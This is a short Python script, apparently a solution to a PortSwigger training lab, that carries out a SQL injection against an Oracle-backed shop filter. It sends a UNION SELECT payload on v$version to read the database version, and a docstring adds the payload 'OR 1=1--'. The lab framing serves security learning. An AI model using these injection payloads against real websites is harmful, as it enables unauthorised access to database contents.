"""
Exploit for lab:
    SQL injection attack, querying the database type and version on Oracle
    https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

By Xqweak.
"""
import requests
import argparse
import urllib

class Exploit_SQLInjection:
    """Class for solving the lab."""
    def __init__(self,url):
        self.url = url

    def retrieve_oracle_version(self):
        """
        In this case, the payload for retrieving all the files is:
        GIFTS' OR 1=1--
        """
        payload = "Pets'+UNION+SELECT+BANNER,+NULL+FROM+v$version--"
        # Encode the payload in url encode.
        payload = urllib.parse.quote(payload)
        print(f'payload is: {payload}')
        url_to_attack = f'{self.url}/filter?category={payload}'
        print(f'victim url is {url_to_attack}')
        ans = requests.get(url_to_attack).content
        return ans


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u' , '--url' , required=True, help="Portswigger's lab url")
    args = parser.parse_args()
    # Run the exploit
    lab = Exploit_SQLInjection(args.url)
    lab.retrieve_oracle_version()
